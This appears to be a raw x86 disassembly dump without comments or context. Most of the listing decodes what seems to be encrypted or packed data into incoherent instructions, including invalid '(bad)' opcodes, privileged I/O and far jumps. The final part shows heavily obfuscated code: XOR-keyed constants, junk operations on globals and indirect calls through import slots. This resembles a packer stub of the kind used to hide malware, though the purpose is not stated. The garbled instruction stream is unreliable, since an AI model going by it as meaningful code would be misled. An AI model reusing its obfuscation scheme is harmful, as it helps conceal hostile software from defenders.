  418bc0:	mov    eax,ds:0x4b728a8e
  418bc5:	call   DWORD PTR [edx-0x2ca5c524]
  418bcb:	push   esp
  418bcc:	mov    esp,0x39885057
  418bd1:	jb     0x418ba6
  418bd3:	out    dx,al
  418bd4:	nop
  418bd5:	push   ss
  418bd6:	repz adc dl,BYTE PTR [edx]
  418bd9:	sub    DWORD PTR [eax-0x59],ecx
  418bdc:	outs   dx,DWORD PTR ds:[esi]
  418bdd:	ins    BYTE PTR es:[edi],dx
  418bde:	dec    eax
  418bdf:	mov    ebp,0xf174f3ac
  418be4:	add    al,0x5e
  418be6:	and    eax,0x4c56dba6
  418beb:	outs   dx,BYTE PTR ds:[esi]
  418bec:	dec    esi
  418bed:	ret    0x9b4e
  418bf0:	loop   0x418b7d
  418bf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bf3:	enter  0x12f7,0x9f
  418bf7:	cmp    al,0xe4
  418bf9:	pop    ebp
  418bfa:	pop    ebp
  418bfb:	sahf   
  418bfc:	mov    DWORD PTR [eax-0x24],ecx
  418bff:	jo     0x418c57
  418c01:	pusha  
  418c02:	pop    edx
  418c03:	sbb    dh,BYTE PTR [esi]
  418c05:	mov    BYTE PTR [edi+0x69],dh
  418c08:	push   edi
  418c09:	inc    edi
  418c0a:	xlat   BYTE PTR ds:[ebx]
  418c0b:	clc    
  418c0c:	scas   eax,DWORD PTR es:[edi]
  418c0d:	mov    ds:0xa3fcb36c,eax
  418c12:	pop    ebp
  418c13:	or     eax,0xb8d0d65a
  418c18:	arpl   ax,si
  418c1a:	jo     0x418c3e
  418c1c:	mov    al,0x39
  418c1e:	pop    ss
  418c1f:	jecxz  0x418c4e
  418c21:	push   es
  418c22:	test   ebx,0xc9d6124d
  418c28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c29:	lds    ebp,FWORD PTR [edi]
  418c2b:	pop    eax
  418c2c:	pop    es
  418c2d:	add    eax,esi
  418c2f:	int3   
  418c30:	jbe    0x418be9
  418c32:	cdq    
  418c33:	rcr    DWORD PTR [ebp+edx*1+0x9746931],1
  418c3a:	mov    DWORD PTR [ebx-0x3690c8ef],ebp
  418c40:	push   ecx
  418c41:	push   ds
  418c42:	ret    
  418c43:	retf   0x5ae3
  418c46:	shl    BYTE PTR [ebx-0x7dc4180b],cl
  418c4c:	mov    al,0xca
  418c4e:	pusha  
  418c4f:	mov    ebp,0x6e260d25
  418c54:	shr    DWORD PTR [esi-0x52],0x94
  418c58:	or     BYTE PTR [ecx],ch
  418c5a:	mov    al,0x59
  418c5c:	xchg   esp,eax
  418c5d:	adc    al,0xdf
  418c5f:	mov    ebx,0x7eb5cf71
  418c64:	dec    esi
  418c65:	bound  ecx,QWORD PTR [ecx+edi*4+0xe]
  418c69:	jne    0x418c05
  418c6b:	add    ebp,DWORD PTR [esi-0x49abf874]
  418c71:	enter  0xa94e,0x55
  418c75:	test   eax,0x241ca4d5
  418c7a:	mov    esp,0x61fe25e4
  418c7f:	rcl    dh,cl
  418c81:	les    ecx,FWORD PTR [ecx]
  418c83:	lods   eax,DWORD PTR ds:[esi]
  418c84:	mov    esi,0xb0ac60f3
  418c89:	pusha  
  418c8a:	cmp    DWORD PTR ds:0x3762f822,esi
  418c90:	mov    ch,0x9a
  418c92:	xor    DWORD PTR [eax-0x6f],esp
  418c95:	mov    ebp,0x27af2413
  418c9a:	mov    cl,0x4c
  418c9c:	xor    DWORD PTR [esi-0x6a],eax
  418c9f:	leave  
  418ca0:	mov    ebx,0x8c3566d3
  418ca5:	jae    0x418c49
  418ca7:	adc    dl,dh
  418ca9:	mov    DWORD PTR [edx+0x3b],esi
  418cac:	push   ds
  418cad:	lock les esp,FWORD PTR [edi-0x57e7e53]
  418cb4:	or     edx,DWORD PTR [ebp-0xc7a21a9]
  418cba:	add    BYTE PTR [ebp+0x6d],0xe3
  418cbe:	inc    eax
  418cbf:	scas   al,BYTE PTR es:[edi]
  418cc0:	test   eax,0xd0f683f0
  418cc5:	mov    eax,0xf0c2fdfc
  418cca:	(bad)  
  418ccb:	cld    
  418ccc:	fdiv   DWORD PTR ds:0xc70d7ff4
  418cd2:	fwait
  418cd3:	jnp    0x418c8c
  418cd5:	fidiv  DWORD PTR [edi]
  418cd7:	mov    bh,0x6a
  418cd9:	or     BYTE PTR [eax+0x58],bl
  418cdc:	mov    ebp,0x4833ad0b
  418ce1:	cwde   
  418ce2:	mov    bl,0x8
  418ce4:	cwde   
  418ce5:	inc    ebp
  418ce6:	sub    ah,ah
  418ce8:	pushf  
  418ce9:	adc    DWORD PTR [ebx+edx*1+0x2c],edx
  418ced:	cmp    al,0x20
  418cef:	pop    esi
  418cf0:	and    BYTE PTR [ebx+edi*4],cl
  418cf3:	or     al,al
  418cf5:	clc    
  418cf6:	dec    edx
  418cf7:	outs   dx,DWORD PTR ds:[esi]
  418cf8:	sub    eax,0x1af06381
  418cfd:	mov    edi,cs
  418cff:	je     0x418cb0
  418d01:	xlat   BYTE PTR ds:[ebx]
  418d02:	inc    eax
  418d03:	pop    esi
  418d04:	sub    eax,0xd3c95c6a
  418d09:	(bad)  
  418d0a:	cli    
  418d0b:	and    dh,BYTE PTR [eax-0x4ded368f]
  418d11:	inc    ebx
  418d12:	and    BYTE PTR [eax],bl
  418d14:	xchg   edx,eax
  418d15:	out    0x5e,al
  418d17:	inc    edi
  418d18:	jl     0x418cbd
  418d1a:	pushf  
  418d1b:	cmp    al,0x90
  418d1d:	sub    esi,DWORD PTR [ecx+0x557118c4]
  418d23:	repnz (bad) 
  418d25:	imul   edi,DWORD PTR [edi+0x4],0x2f
  418d29:	jl     0x418cf1
  418d2b:	int3   
  418d2c:	lea    edx,[ecx+0x10953e71]
  418d32:	(bad)  
  418d33:	jnp    0x418d07
  418d35:	pop    es
  418d36:	mov    ss:0xf150cbfc,eax
  418d3c:	dec    edx
  418d3d:	sbb    dh,BYTE PTR [ecx-0x75]
  418d40:	sbb    DWORD PTR [ebx],0x1d6f4e07
  418d46:	iret   
  418d47:	(bad)  
  418d48:	daa    
  418d49:	mov    al,0xa6
  418d4b:	push   eax
  418d4c:	inc    edx
  418d4d:	push   es
  418d4e:	mov    dh,0xd6
  418d50:	mov    esp,0xa8f28397
  418d55:	aad    0x90
  418d57:	into   
  418d58:	out    0x19,eax
  418d5a:	mov    ?,WORD PTR [edi]
  418d5c:	cdq    
  418d5d:	jmp    0x63c8e04a
  418d62:	push   ebx
  418d63:	xlat   BYTE PTR ds:[ebx]
  418d64:	fild   WORD PTR [edi+0x20]
  418d67:	xor    ebp,esi
  418d69:	inc    ecx
  418d6a:	mov    eax,0x96ae3df0
  418d6f:	push   ebp
  418d70:	pusha  
  418d71:	ds aaa 
  418d73:	cwde   
  418d74:	stos   BYTE PTR es:[edi],al
  418d75:	mov    bl,0x3f
  418d77:	mov    esi,DWORD PTR [eax-0x33]
  418d7a:	mov    ch,0x6
  418d7c:	cmp    BYTE PTR [eax-0x2bf4ead1],bl
  418d82:	add    cl,BYTE PTR ds:0x68f8ffbb
  418d88:	inc    ebx
  418d89:	in     al,0xf0
  418d8b:	call   0xb1789c0f
  418d90:	repz mov cl,0x87
  418d93:	pop    edi
  418d94:	jmp    0x73c1f758
  418d99:	aam    0x22
  418d9b:	xchg   ebp,eax
  418d9c:	cmp    BYTE PTR [eax-0x215dd3ce],bh
  418da2:	adc    bl,dh
  418da4:	mov    esp,0x14c0775f
  418da9:	(bad)
  418dac:	cmp    eax,0xa2331c59
  418db1:	lds    edx,FWORD PTR [eax-0x895e86c]
  418db7:	jbe    0x418d6a
  418db9:	xchg   bl,dl
  418dbb:	cld    
  418dbc:	xor    cl,BYTE PTR gs:[ebx-0x3e]
  418dc0:	inc    edi
  418dc1:	adc    BYTE PTR [edx+ebx*8],al
  418dc4:	xchg   DWORD PTR [ecx+0x47],esp
  418dc7:	push   ebx
  418dc8:	xor    al,cl
  418dca:	inc    esi
  418dcb:	inc    eax
  418dcc:	in     al,dx
  418dcd:	fwait
  418dce:	inc    ecx
  418dcf:	popf   
  418dd0:	repz adc dl,BYTE PTR [ecx+edi*4]
  418dd4:	aaa    
  418dd5:	xchg   ebp,eax
  418dd6:	push   esi
  418dd7:	dec    eax
  418dd8:	pop    esp
  418dd9:	mov    esi,DWORD PTR ds:0x876182e9
  418ddf:	xchg   ebx,eax
  418de0:	xor    al,0x3a
  418de2:	pop    edi
  418de3:	leave  
  418de4:	adc    eax,0xe39c7c18
  418de9:	cs mov bh,0x5b
  418dec:	jbe    0x418d91
  418dee:	mov    dh,0xe3
  418df0:	cwde   
  418df1:	or     eax,0x7fe981a6
  418df6:	or     eax,0xe77bb9a9
  418dfb:	loop   0x418de1
  418dfd:	aaa    
  418dfe:	aad    0x2c
  418e00:	call   FWORD PTR cs:[edx+0x49869d7e]
  418e07:	add    esp,eax
  418e09:	push   eax
  418e0a:	cli    
  418e0b:	jb     0x418e74
  418e0d:	imul   ecx,DWORD PTR [esi+edx*8],0x5d
  418e11:	je     0x418e41
  418e13:	ins    BYTE PTR es:[edi],dx
  418e14:	arpl   WORD PTR [esi-0x55],bx
  418e17:	div    ebx
  418e19:	mov    ah,0xaf
  418e1b:	mov    al,ds:0xe02ef740
  418e20:	jno    0x418e79
  418e22:	pop    es
  418e23:	arpl   bp,bx
  418e25:	mov    esp,0x470e75c7
  418e2a:	out    dx,eax
  418e2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e2c:	fwait
  418e2d:	pop    ebp
  418e2e:	(bad)  [edi+0x1b1535b4]
  418e34:	lds    ecx,FWORD PTR [ecx]
  418e36:	mov    ds:0x44ba4e32,al
  418e3b:	mov    edi,0x48b7f04f
  418e40:	jge    0x418dc7
  418e42:	in     al,0x76
  418e44:	or     DWORD PTR [eax],ecx
  418e46:	and    DWORD PTR [edx+0x37ac1807],ebp
  418e4c:	inc    edi
  418e4d:	gs ins DWORD PTR es:[edi],dx
  418e4f:	and    DWORD PTR [ecx],ebx
  418e51:	ret    0x4ce5
  418e54:	icebp  
  418e55:	sbb    esp,DWORD PTR [ecx+0x508954ad]
  418e5b:	mov    ch,BYTE PTR [edx-0x30eb2580]
  418e61:	out    0xbd,al
  418e63:	pop    edx
  418e64:	mov    dh,0x80
  418e66:	or     eax,0xb7ec79ec
  418e6b:	loope  0x418e41
  418e6d:	cmp    edx,eax
  418e6f:	ja     0x418e08
  418e71:	or     al,0x5f
  418e73:	dec    esp
  418e74:	jecxz  0x418e99
  418e76:	pop    ss
  418e77:	jmp    0x2484:0x80cd0c2b
  418e7e:	lahf   
  418e7f:	rol    edi,0x7c
  418e82:	xor    eax,0x6cb300f7
  418e87:	mov    edi,0xd3718b75
  418e8c:	jbe    0x418ecb
  418e8e:	push   ebp
  418e8f:	cli    
  418e90:	data16 mov gs,WORD PTR [eax-0x4553611c]
  418e97:	adc    eax,0x39501080
  418e9c:	push   ebp
  418e9d:	push   edx
  418e9e:	dec    esi
  418e9f:	(bad)  
  418ea0:	jno    0x418e89
  418ea2:	(bad)  
  418ea3:	or     BYTE PTR [ebp+0x4cc9642b],bh
  418ea9:	xor    al,0xd0
  418eab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418eac:	jl     0x418ea8
  418eae:	push   ecx
  418eaf:	xchg   ecx,eax
  418eb0:	pop    ebx
  418eb1:	adc    esi,DWORD PTR [esi+0x4fc7a310]
  418eb7:	cmp    eax,DWORD PTR [ecx+0x21]
  418eba:	mov    edi,0x8cc6db7f
  418ebf:	mov    BYTE PTR [ebp-0x68e1ce5e],ch
  418ec5:	test   eax,0x55546a10
  418eca:	jge    0x418e90
  418ecc:	or     edx,edx
  418ece:	xor    ebx,esi
  418ed0:	iret   
  418ed1:	inc    ebx
  418ed2:	daa    
  418ed3:	ss loop 0x418f18
  418ed6:	mov    esi,DWORD PTR [ebx+0x67]
  418ed9:	cdq    
  418eda:	cli    
  418edb:	shl    DWORD PTR ds:[edi+edx*1-0x49],cl
  418ee0:	cmp    eax,esp
  418ee2:	aam    0xc3
  418ee4:	push   ecx
  418ee5:	das    
  418ee6:	rcl    al,1
  418ee8:	mov    edi,0xd0a77ab5
  418eed:	mov    WORD PTR [edx-0x77],ds
  418ef0:	outs   dx,BYTE PTR ds:[esi]
  418ef1:	jmp    0xac4:0xf9513e3
  418ef8:	sbb    BYTE PTR [edx+ecx*4+0x37],ch
  418efc:	(bad)  
  418efd:	fld    TBYTE PTR [edx-0x63b2001c]
  418f03:	aam    0xab
  418f05:	imul   esp,DWORD PTR [ebp+0x5fddbf44],0x17
  418f0c:	dec    eax
  418f0d:	jb     0x418f27
  418f0f:	mov    ebp,0x70736e6a
  418f14:	loop   0x418f0f
  418f16:	jbe    0x418f74
  418f18:	loopne 0x418f3b
  418f1a:	aam    0x8a
  418f1c:	pop    ds
  418f1d:	clc    
  418f1e:	push   edx
  418f1f:	pop    es
  418f20:	std    
  418f21:	and    al,0xf0
  418f23:	les    edi,FWORD PTR [ebx+0x5f]
  418f26:	adc    ebx,DWORD PTR [edi]
  418f28:	adc    eax,0x6cff28a7
  418f2d:	cmp    eax,0xb7f83d53
  418f32:	fcmovu st,st(2)
  418f34:	adc    eax,edi
  418f36:	xchg   DWORD PTR [ebx+0x69],eax
  418f39:	stos   BYTE PTR es:[edi],al
  418f3a:	push   ebx
  418f3b:	cmp    al,0x7e
  418f3d:	push   es
  418f3e:	mov    ?,ecx
  418f40:	or     ch,ch
  418f42:	es mov ebx,0x1dc5a92c
  418f48:	mov    edi,0xa7a463eb
  418f4d:	stc    
  418f4e:	fist   DWORD PTR [ebx-0x48]
  418f51:	dec    ebx
  418f52:	xchg   ebx,eax
  418f53:	mov    ebx,0xd16d9f05
  418f58:	(bad)  
  418f5a:	aad    0xd4
  418f5c:	xchg   esp,eax
  418f5d:	shl    BYTE PTR [edi],cl
  418f5f:	mul    DWORD PTR [edi-0x39]
  418f62:	iret   
  418f63:	cdq    
  418f64:	mov    ch,0xbd
  418f66:	xchg   esi,eax
  418f67:	push   edx
  418f68:	in     eax,0x95
  418f6a:	and    al,0x74
  418f6c:	jecxz  0x418fd4
  418f6e:	movups xmm0,xmm6
  418f71:	ret    
  418f72:	xchg   DWORD PTR [esi+0x7b],esi
  418f75:	cs aad 0x84
  418f78:	adc    ah,BYTE PTR [eax+ecx*1]
  418f7b:	push   edx
  418f7c:	sbb    esi,edi
  418f7e:	lds    ebx,FWORD PTR [ebp-0x5fb41f4e]
  418f84:	jmp    0x418f13
  418f86:	or     BYTE PTR [eax],dl
  418f88:	sbb    al,0x6a
  418f8a:	sti    
  418f8b:	jns    0x418f6d
  418f8d:	fcomp  QWORD PTR [ecx]
  418f8f:	dec    eax
  418f90:	mov    BYTE PTR [ebp-0x1182f498],dh
  418f96:	xchg   esp,eax
  418f97:	ja     0x418fe0
  418f99:	pop    ds
  418f9a:	push   ds
  418f9b:	mov    eax,ds:0x85bc5f86
  418fa0:	mov    ch,0xcd
  418fa2:	xchg   bl,cl
  418fa4:	mov    al,0xc4
  418fa6:	add    eax,0xb98eaa13
  418fab:	imul   edi,DWORD PTR [ecx+0x521e4eab],0x4fd48cb8
  418fb5:	rol    DWORD PTR [esi+0x764776d7],1
  418fbb:	(bad)  
  418fbc:	fild   DWORD PTR [ecx-0x2f]
  418fbf:	mov    al,0x5f
  418fc1:	das    
  418fc2:	das    
  418fc3:	jo     0x419032
  418fc5:	enter  0x34b6,0x4f
  418fc9:	scas   eax,DWORD PTR es:[edi]
  418fca:	scas   eax,DWORD PTR es:[edi]
  418fcb:	add    al,0xa9
  418fcd:	sbb    al,0x4e
  418fcf:	mov    bl,BYTE PTR [edx-0x43]
  418fd2:	into   
  418fd3:	aad    0x5a
  418fd5:	add    ebx,DWORD PTR [eax+eax*8-0x5e]
  418fd9:	fistp  DWORD PTR ds:0x11205373
  418fdf:	and    BYTE PTR [ecx-0x4982cfd4],0xa9
  418fe6:	xchg   esi,eax
  418fe7:	lahf   
  418fe8:	imul   edi,ebp,0xdd93da2b
  418fee:	mov    ecx,DWORD PTR [ecx]
  418ff0:	add    ecx,ebp
  418ff2:	inc    dh
  418ff4:	loop   0x418fd2
  418ff6:	fdiv   DWORD PTR [esi+0x3b8e0d1b]
  418ffc:	in     eax,dx
  418ffd:	cmp    ebp,DWORD PTR [edx+0x54]
  419000:	in     eax,0x96
  419002:	les    ebp,FWORD PTR [eax+0x478bd76c]
  419008:	(bad)  
  419009:	xor    BYTE PTR [ebx-0x20256cab],cl
  41900f:	cmp    DWORD PTR [ebx-0x65],ecx
  419012:	pop    esp
  419013:	cld    
  419014:	mov    ds:0x68d63ad1,eax
  419019:	lahf   
  41901a:	push   ebx
  41901b:	pop    esi
  41901c:	push   cs
  41901d:	fadd   QWORD PTR [esi]
  41901f:	(bad)  
  419020:	xchg   ecx,eax
  419021:	push   edx
  419022:	xchg   edx,eax
  419023:	stc    
  419024:	ret    
  419025:	sub    eax,0x93bf88d5
  41902a:	lock int 0xc1
  41902d:	nop
  41902e:	xchg   ecx,eax
  41902f:	sbb    ah,BYTE PTR [esi-0x6abcb203]
  419035:	cli    
  419036:	dec    esi
  419037:	adc    edi,DWORD PTR [ebx]
  419039:	push   edi
  41903a:	fnstenv [esi+0x4d60b21b]
  419040:	xchg   DWORD PTR ds:0xa797d9ed,ebx
  419046:	or     al,0xdc
  419048:	jmp    0x52b8f214
  41904d:	mov    al,0xfc
  41904f:	xchg   eax,eax
  419051:	icebp  
  419052:	sbb    ah,dl
  419054:	leave  
  419055:	mov    bl,0x37
  419057:	or     al,0x9
  419059:	js     0x4190a6
  41905b:	sbb    ebx,DWORD PTR [edi-0x3b82c2f8]
  419061:	jle    0x4190c6
  419063:	jg     0x4190a5
  419065:	shr    DWORD PTR [eax],cl
  419067:	xchg   ebp,eax
  419068:	and    BYTE PTR [eax],ah
  41906a:	imul   edx,DWORD PTR [eax+0x8],0xa087efb9
  419071:	push   eax
  419072:	mov    cl,0x33
  419074:	xor    eax,0x27070099
  419079:	jl     0x4190d3
  41907b:	call   0x71d3:0x26bcb69d
  419082:	add    dl,BYTE PTR [ebx+0x6b20d748]
  419088:	or     eax,DWORD PTR [edi]
  41908a:	sbb    ecx,ebp
  41908c:	(bad)  
  41908d:	loop   0x419016
  41908f:	stc    
  419090:	dec    esi
  419091:	mov    al,ds:0x7d741967
  419096:	push   ebp
  419097:	cli    
  419098:	and    BYTE PTR [eax+0x3b89db8b],0x93
  41909f:	adc    al,0x9
  4190a1:	mov    WORD PTR [ecx+0x2d],ds
  4190a4:	imul   ecx,DWORD PTR [esi-0x2e4c3753],0x6fb7e8ab
  4190ae:	dec    ebx
  4190af:	js     0x4190c3
  4190b1:	outs   dx,DWORD PTR ds:[esi]
  4190b2:	pusha  
  4190b3:	xchg   edx,eax
  4190b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190b5:	mov    ds:0x60cecf60,eax
  4190ba:	push   eax
  4190bb:	sbb    eax,DWORD PTR [ebx+0x450642f]
  4190c1:	clc    
  4190c2:	adc    DWORD PTR [edi-0x710985b8],0x6310fd56
  4190cc:	xchg   edx,eax
  4190cd:	jno    0x4190a5
  4190cf:	icebp  
  4190d0:	jmp    0x981b:0x794db709
  4190d7:	aaa    
  4190d8:	test   DWORD PTR [ecx+0x7e],eax
  4190db:	int3   
  4190dc:	int    0x41
  4190de:	ret    
  4190df:	cmc    
  4190e0:	popa   
  4190e1:	xchg   esp,eax
  4190e2:	stos   BYTE PTR es:[edi],al
  4190e3:	add    DWORD PTR [ebx+0x3dbcea87],ecx
  4190e9:	jno    0x419140
  4190eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190ec:	enter  0x383b,0xb0
  4190f0:	jge    0x419085
  4190f2:	out    0x5,eax
  4190f4:	fcom   DWORD PTR [ebx+0x6e5840d6]
  4190fa:	es push ss
  4190fc:	add    BYTE PTR [edx+esi*4],ah
  4190ff:	push   ds
  419100:	sub    BYTE PTR [ebx+0x22e84cad],0xb8
  419107:	adc    bl,BYTE PTR [esi+0x5e]
  41910a:	and    eax,0x2a2ccab2
  41910f:	punpckhwd mm1,QWORD PTR [ebx-0x7b]
  419113:	outs   dx,DWORD PTR ds:[esi]
  419114:	xchg   ecx,eax
  419115:	bound  esp,QWORD PTR [ecx+eiz*1-0x648b78e7]
  41911c:	cli    
  41911d:	repnz cmp edi,esi
  419120:	mov    ch,BYTE PTR [edx-0x66]
  419123:	jge    0x4190ed
  419125:	mov    esi,0xe7649e01
  41912a:	sbb    esi,DWORD PTR ds:0x7bcc2eae
  419130:	mov    ebx,0xd8dcb5e8
  419135:	outs   dx,DWORD PTR ds:[esi]
  419136:	xor    al,0xa4
  419138:	jl     0x4190e3
  41913a:	and    BYTE PTR [ebx],ah
  41913c:	jo     0x419182
  41913e:	inc    esi
  41913f:	sbb    ch,BYTE PTR [edx]
  419141:	pop    esp
  419142:	test   eax,0xd1feb576
  419147:	push   edi
  419148:	outs   dx,BYTE PTR ds:[esi]
  419149:	jne    0x419189
  41914b:	dec    esi
  41914c:	pop    es
  41914d:	jb     0x419118
  41914f:	sub    ecx,DWORD PTR ds:0xe85856aa
  419155:	stos   BYTE PTR es:[edi],al
  419156:	daa    
  419157:	les    ecx,FWORD PTR [edx+0x264197e7]
  41915d:	xchg   edi,eax
  41915e:	aad    0x65
  419160:	cld    
  419161:	sahf   
  419162:	push   esp
  419163:	jle    0x419188
  419165:	dec    edi
  419166:	and    al,0x23
  419168:	xchg   ecx,eax
  419169:	ja     0x41912d
  41916b:	mov    al,0x1c
  41916d:	xchg   ecx,eax
  41916e:	add    bl,0xa1
  419171:	push   cs
  419172:	pop    ecx
  419173:	test   al,0x78
  419175:	neg    esi
  419177:	push   eax
  419178:	fmulp  st(6),st
  41917a:	sahf   
  41917b:	mov    ds,WORD PTR [edx+0x756bef80]
  419181:	and    dh,BYTE PTR cs:[esi+0x7dfcbc19]
  419188:	ss cmp eax,0x11fa8214
  41918e:	mov    ebx,0xdadeb677
  419193:	mov    dl,BYTE PTR [ecx-0x239ac963]
  419199:	push   es
  41919a:	push   ds
  41919b:	out    0x1c,eax
  41919d:	scas   eax,DWORD PTR es:[edi]
  41919e:	push   ebx
  41919f:	mov    al,0xe2
  4191a1:	adc    al,0xa1
  4191a3:	cmp    esp,DWORD PTR [ebp-0x22a643a4]
  4191a9:	mov    ebp,0xfb2afd44
  4191ae:	cmc    
  4191af:	or     cl,bh
  4191b1:	lock mov ebp,0x7226c7ca
  4191b7:	lea    edx,[ebx]
  4191b9:	fadd   DWORD PTR [ebx-0x7417ba75]
  4191bf:	push   ebp
  4191c0:	lock xor eax,esi
  4191c3:	lea    eax,[eax+edx*1+0x3272db]
  4191ca:	mov    DWORD PTR [ebp-0x10],eax
  4191cd:	jmp    0x40deb0
  4191d2:	mov    eax,DWORD PTR [ebp-0x34]
  4191d5:	mov    edx,DWORD PTR [ebp+0xc]
  4191d8:	xor    edx,esi
  4191da:	lea    ecx,[ecx+edx*1+0x3272db]
  4191e1:	lea    edx,[ecx-0x3272db]
  4191e7:	xor    edx,esi
  4191e9:	cmp    edx,0xf89c95b6
  4191ef:	jne    0x40dd2f
  4191f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4191f8:	mov    edx,DWORD PTR [ebp+0xc]
  4191fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4191fe:	xor    edx,esi
  419200:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  419207:	xor    ecx,esi
  419209:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  419210:	xor    ebx,esi
  419212:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  419219:	mov    edx,DWORD PTR [ebp+0xc]
  41921c:	xor    edx,esi
  41921e:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  419225:	mov    eax,DWORD PTR [ebp+0xc]
  419228:	xor    eax,esi
  41922a:	add    eax,edi
  41922c:	pop    edi
  41922d:	pop    esi
  41922e:	pop    ebx
  41922f:	leave  
  419230:	ret    0x8
  419233:	push   ebp
  419234:	mov    ebp,esp
  419236:	mov    DWORD PTR ds:0x421a62,0xf89c85b5
  419240:	pop    ebp
  419241:	jmp    0x4193b5
  419246:	push   ebp
  419247:	mov    ebp,esp
  419249:	push   ecx
  41924a:	and    DWORD PTR ds:0x42c010,0x0
  419254:	jmp    0x419266
  419259:	mov    edx,DWORD PTR ds:0x42c010
  41925f:	inc    edx
  419260:	mov    DWORD PTR ds:0x42c010,edx
  419266:	cmp    DWORD PTR ds:0x42c010,0x19
  41926d:	jae    0x4192ae
  419273:	cmp    DWORD PTR ds:0x42c010,0x9
  41927a:	jne    0x419289
  419280:	push   DWORD PTR [ebp-0x18]
  419283:	call   DWORD PTR ds:0x42401c
  419289:	cmp    DWORD PTR ds:0x42c010,0x8
  419290:	jne    0x4192a3
  419296:	mov    edx,DWORD PTR ds:0x42c010
  41929c:	inc    edx
  41929d:	mov    DWORD PTR ds:0x42c010,edx
  4192a3:	jmp    0x419259
  4192a8:	or     DWORD PTR ds:0x42c004,ebx
  4192ae:	push   ecx
  4192af:	movzx  eax,BYTE PTR ds:0x42b00c
  4192b6:	and    DWORD PTR ds:0x42a01c,eax
  4192bc:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  4192c3:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4192ca:	mov    DWORD PTR ds:0x428008,0x13
  4192d4:	cmp    DWORD PTR ds:0x428008,0x0
  4192db:	je     0x41930a
  4192e1:	cmp    DWORD PTR ds:0x428008,0x20
  4192e8:	jne    0x4192fa
  4192ee:	push   DWORD PTR [ebp-0x14]
  4192f1:	push   DWORD PTR [ebp-0x1c]
  4192f4:	call   DWORD PTR ds:0x424020
  4192fa:	mov    eax,ds:0x428008
  4192ff:	dec    eax
  419300:	mov    ds:0x428008,eax
  419305:	jmp    0x4192d4
  41930a:	mov    eax,DWORD PTR [ebp-0x4]
  41930d:	and    DWORD PTR ds:0x429008,0x428020
  419317:	push   esi
  419318:	adc    DWORD PTR ds:0x42c000,0x1310
  419322:	mov    esi,DWORD PTR [ebp-0x8]
  419325:	mov    edx,0x7510893
  41932a:	xor    eax,edx
  41932c:	mov    ecx,DWORD PTR ds:0x42a000
  419332:	and    DWORD PTR ds:0x429014,ecx
  419338:	xor    esi,edx
  41933a:	mov    ecx,DWORD PTR ds:0x4237ad
  419340:	mov    ecx,DWORD PTR [ecx]
  419342:	sbb    DWORD PTR ds:0x42b00c,ecx
  419348:	mov    ecx,0x3272db
  41934d:	add    esi,ecx
  41934f:	add    eax,ecx
  419351:	imul   eax,esi
  419354:	mov    esi,DWORD PTR [ebp+0xc]
  419357:	cmp    esi,eax
  419359:	jne    0x419375
  41935f:	mov    eax,DWORD PTR [ebp-0x4]
  419362:	mov    esi,DWORD PTR [ebp-0x8]
  419365:	xor    eax,edx
  419367:	xor    esi,edx
  419369:	add    eax,ecx
  41936b:	add    esi,ecx
  41936d:	imul   eax,esi
  419370:	jmp    0x4193b0
  419375:	mov    eax,DWORD PTR [ebp+0xc]
  419378:	mov    eax,DWORD PTR [eax+0x78]
  41937b:	mov    DWORD PTR [ebp+0xc],eax
  41937e:	mov    eax,DWORD PTR [ebp-0x4]
  419381:	mov    esi,DWORD PTR [ebp-0x8]
  419384:	xor    eax,edx
  419386:	xor    esi,edx
  419388:	add    eax,ecx
  41938a:	add    esi,ecx
  41938c:	imul   eax,esi
  41938f:	mov    esi,DWORD PTR [ebp+0xc]
  419392:	cmp    esi,eax
  419394:	mov    eax,DWORD PTR [ebp-0x4]
  419397:	je     0x419362
  41939d:	xor    eax,edx
  41939f:	add    eax,ecx
  4193a1:	mov    ecx,DWORD PTR [ebp+0xc]
  4193a4:	imul   eax,ecx
  4193a7:	add    eax,DWORD PTR [ebp+0x8]
  4193aa:	mov    DWORD PTR [ebp+0xc],eax
  4193ad:	mov    eax,DWORD PTR [ebp+0xc]
  4193b0:	pop    esi
  4193b1:	leave  
  4193b2:	ret    0x8
  4193b5:	push   ebp
  4193b6:	mov    ebp,esp
  4193b8:	sub    esp,0x80
  4193be:	push   ebx
  4193bf:	push   esi
  4193c0:	push   edi
  4193c1:	mov    DWORD PTR ds:0x42c010,0xf9a
  4193cb:	mov    DWORD PTR [ebp-0x3c],0x0
  4193d2:	dec    eax
  4193d3:	mov    eax,DWORD PTR [ebp-0x18]
  4193d6:	mov    DWORD PTR [ebp-0x18],eax
  4193d9:	adc    DWORD PTR ds:0x429014,0x42801c
  4193e3:	push   0x421a66
  4193e8:	call   DWORD PTR ds:0x42402c
  4193ee:	adc    DWORD PTR ds:0x428018,0x3fb
  4193f8:	push   0x0
  4193fa:	push   0x67
  4193fc:	sbb    DWORD PTR ds:0x42b008,0x4024
  419406:	push   0xc
  419408:	mov    DWORD PTR ds:0x429000,0x5718
  419412:	push   0x3
  419414:	and    DWORD PTR ds:0x42b004,0x67ab
  41941e:	push   0x2
  419420:	push   0x78769798
  419425:	or     DWORD PTR ds:0x428024,0x42c014
  41942f:	call   DWORD PTR ds:0x42400c
  419435:	or     DWORD PTR ds:0x42c000,0x429014
  41943f:	push   0x57658733
  419444:	and    DWORD PTR ds:0x42c000,0x42900c
  41944e:	call   DWORD PTR ds:0x424008
  419454:	push   0x97667654
  419459:	call   DWORD PTR ds:0x424000
  41945f:	movzx  ebx,BYTE PTR ds:0x428004
  419466:	mov    eax,DWORD PTR [ebp-0x18]
  419469:	mov    ebx,0xf89c85b6
  41946e:	mov    DWORD PTR ds:0x42c018,0x6f46
  419478:	cmp    eax,ebx
  41947a:	mov    DWORD PTR ds:0x42c010,0x6381
  419484:	jne    0x4194d6
